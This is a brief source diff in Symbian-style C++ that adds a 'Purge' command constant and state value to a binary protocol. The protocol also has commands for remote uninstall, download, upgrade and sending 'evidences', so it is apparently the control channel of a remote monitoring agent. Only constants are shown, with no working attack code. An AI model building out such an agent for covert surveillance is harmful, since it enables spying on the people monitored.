@@ -19,6 +19,7 @@ _LIT8(KProto_Ok, "\x01\x00\x00\x00");
 _LIT8(KProto_No, "\x02\x00\x00\x00");
 _LIT8(KProto_Bye, "\x03\x00\x00\x00");
 _LIT8(KProto_NewConf, "\x07\x00\x00\x00");
+_LIT8(KProto_Purge,"\x1a\x00\x00\x00");
 _LIT8(KProto_Log, "\x09\x00\x00\x00");
 _LIT8(KProto_CmdUninstall, "\x0A\x00\x00\x00");
 _LIT8(KProto_Download, "\x0C\x00\x00\x00");
@@ -48,6 +49,7 @@ enum TState
 	EState_Upgrade = 0x16,
 	EState_Evidences = 0x9,
 	EState_Cmd_Uninstall = 0xa,
+	EState_Purge = 0x1a,
 	EState_Bye = 0x3
 	};
 
